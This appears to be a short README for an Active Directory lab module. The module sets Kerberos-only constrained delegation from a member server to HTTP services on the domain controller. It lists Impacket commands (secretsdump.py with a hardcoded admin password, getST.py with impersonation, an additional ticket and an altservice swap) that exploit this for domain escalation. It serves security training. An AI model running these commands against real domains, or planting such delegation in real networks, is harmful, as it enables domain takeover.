# constrained-deleg-kerb

Adds `HTTP/<dc fqdn>` and `HTTP/<dc hostname>` to `msDS-AllowedToDelegateTo` of the target member server's computer account (constrained delegation, Kerberos only: no protocol transition).

Attack (needs the computer account secret, e.g. local admin on the host, and a forwardable ticket: combine with RBCD on the host itself or a user TGS):

    secretsdump.py <domain>/administrator:'Aa1234567890!'@<host ip>   # machine account hash
    getST.py -spn 'HTTP/<dc fqdn>' -impersonate Administrator -additional-ticket <forwardable TGS> <domain>/'<host>$' -hashes :<nt hash>
    # change the service class in the ticket (HTTP -> CIFS/HOST) with -altservice

How to verify:

    Get-ADComputer <host> -Properties msDS-AllowedToDelegateTo   # on the DC

Disable removes exactly those two values (empty in Base).
